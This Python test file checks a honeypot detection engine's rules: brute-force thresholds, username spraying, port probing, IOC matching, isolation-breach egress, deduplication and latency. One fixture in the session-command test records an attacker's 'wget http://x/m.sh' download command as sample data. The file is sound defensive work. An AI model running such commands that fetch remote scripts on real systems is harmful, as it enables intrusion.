"""Detection rule behaviour: positive cases (T-05), negative cases (T-06),
deduplication (T-07), and explainable evidence (FR-11)."""
import uuid
from datetime import datetime, timedelta, timezone


def mk_event(db, **kw):
    now = kw.pop("event_time", datetime.now(timezone.utc))
    ev = {
        "_id": str(uuid.uuid4()), "source_type": kw.get("source_type", "cowrie"), "sensor_id": "s",
        "event_time": now, "ingested_at": now, "src_ip": None, "src_port": None, "dst_ip": None,
        "dst_port": None, "service": "ssh", "protocol": "tcp", "event_category": "auth_failure",
        "outcome": "failed", "session_id": None, "username": None, "credential_fp": None, "command": None,
        "http_path": None, "decoy_id": "decoy-ssh", "tags": [], "approved_source": False, "parser_status": "parsed",
    }
    ev.update(kw)
    ev["event_time"] = now
    db.events.insert_one(ev)
    return ev


def feed(engine, db, events):
    touched = []
    for ev in events:
        touched += engine.evaluate(ev)
    return touched


def test_det01_brute_force_fires_at_threshold(engine, db):
    base = datetime.now(timezone.utc)
    evs = [mk_event(db, src_ip="203.0.113.1", username=f"u{i}", event_time=base + timedelta(seconds=i))
           for i in range(5)]
    feed(engine, db, evs)
    alert = db.alerts.find_one({"rule_id": "DET-01"})
    assert alert is not None
    assert alert["severity"] == "high"
    assert alert["event_count"] >= 5
    assert "within 60s" in alert["matched_evidence"]["condition"]


def test_det01_below_threshold_does_not_fire(engine, db):
    base = datetime.now(timezone.utc)
    evs = [mk_event(db, src_ip="203.0.113.2", event_time=base + timedelta(seconds=i)) for i in range(4)]
    feed(engine, db, evs)
    assert db.alerts.count_documents({"rule_id": "DET-01"}) == 0


def test_det01_outside_window_does_not_fire(engine, db):
    base = datetime.now(timezone.utc)
    # 5 failures but spread over 5 minutes -> never 5 within 60s
    evs = [mk_event(db, src_ip="203.0.113.3", event_time=base + timedelta(seconds=i * 70)) for i in range(5)]
    feed(engine, db, evs)
    assert db.alerts.count_documents({"rule_id": "DET-01"}) == 0


def test_approved_source_is_suppressed(engine, db):
    base = datetime.now(timezone.utc)
    evs = [mk_event(db, src_ip="203.0.113.4", approved_source=True, event_time=base + timedelta(seconds=i))
           for i in range(8)]
    feed(engine, db, evs)
    assert db.alerts.count_documents({"rule_id": "DET-01"}) == 0


def test_dedup_groups_repeats_into_one_alert(engine, db):
    base = datetime.now(timezone.utc)
    # 10 failures within the window -> still ONE alert, but all events preserved
    evs = [mk_event(db, src_ip="203.0.113.5", event_time=base + timedelta(seconds=i)) for i in range(10)]
    feed(engine, db, evs)
    assert db.alerts.count_documents({"rule_id": "DET-01"}) == 1
    alert = db.alerts.find_one({"rule_id": "DET-01"})
    assert alert["event_count"] == 10
    assert len(alert["event_ids"]) == 10  # underlying evidence not discarded


def test_det02_distinct_usernames(engine, db):
    base = datetime.now(timezone.utc)
    evs = [mk_event(db, src_ip="203.0.113.6", service="ftp", source_type="opencanary", decoy_id="decoy-canary",
                    username=f"user{i}", event_time=base + timedelta(seconds=i * 2)) for i in range(4)]
    feed(engine, db, evs)
    assert db.alerts.count_documents({"rule_id": "DET-02"}) == 1


def test_det03_port_probing_distinct_endpoints(engine, db):
    base = datetime.now(timezone.utc)
    evs = [mk_event(db, src_ip="203.0.113.7", event_category="connection", decoy_id="decoy-canary",
                    dst_endpoint=f"10.66.0.11:{1000 + i}", event_time=base + timedelta(seconds=i))
           for i in range(11)]
    feed(engine, db, evs)
    assert db.alerts.count_documents({"rule_id": "DET-03"}) == 1


def test_det04_session_command_severity_by_tag(engine, db):
    ev = mk_event(db, src_ip="203.0.113.8", event_category="session_command", session_id="sess-x",
                  command="wget http://x/m.sh", tags=["cmd:download"])
    engine.evaluate(ev)
    alert = db.alerts.find_one({"rule_id": "DET-04"})
    assert alert is not None
    assert alert["severity"] == "high"  # download escalates above the medium default


def test_det07_ioc_match(engine, db):
    engine.indicators = {"198.51.100.23"}
    ev = mk_event(db, src_ip="198.51.100.23", event_category="web_request", source_type="http_decoy",
                  service="http", decoy_id="decoy-web")
    engine.evaluate(ev)
    alert = db.alerts.find_one({"rule_id": "DET-07"})
    assert alert is not None
    assert "lead" in alert["matched_evidence"]["condition"].lower()


def test_det08_isolation_breach_critical(engine, db):
    ev = mk_event(db, event_category="egress_attempt", outcome="allowed", decoy_id="decoy-web",
                  egress_target="8.8.8.8:443", source_type="http_decoy", service="decoy")
    engine.evaluate(ev)
    alert = db.alerts.find_one({"rule_id": "DET-08"})
    assert alert is not None
    assert alert["severity"] == "critical"
    assert alert["kind"] == "isolation"


def test_det10_post_response_reinteraction(engine, db):
    now = datetime.now(timezone.utc)
    # an existing contained alert for this source
    db.alerts.insert_one({"_id": "ALR-X", "rule_id": "DET-01", "src_ip": "203.0.113.9",
                          "status": "Contained (lab only)", "contained_at": now - timedelta(minutes=1)})
    ev = mk_event(db, src_ip="203.0.113.9", event_category="connection", event_time=now)
    engine.evaluate(ev)
    assert db.alerts.count_documents({"rule_id": "DET-10"}) == 1


def test_latency_recorded(engine, db):
    ev = mk_event(db, src_ip="203.0.113.10", event_category="egress_attempt", outcome="allowed",
                  decoy_id="decoy-web", egress_target="x:1", source_type="http_decoy")
    engine.evaluate(ev)
    alert = db.alerts.find_one({"rule_id": "DET-08"})
    assert alert["detection_latency_ms"] is not None and alert["detection_latency_ms"] >= 0
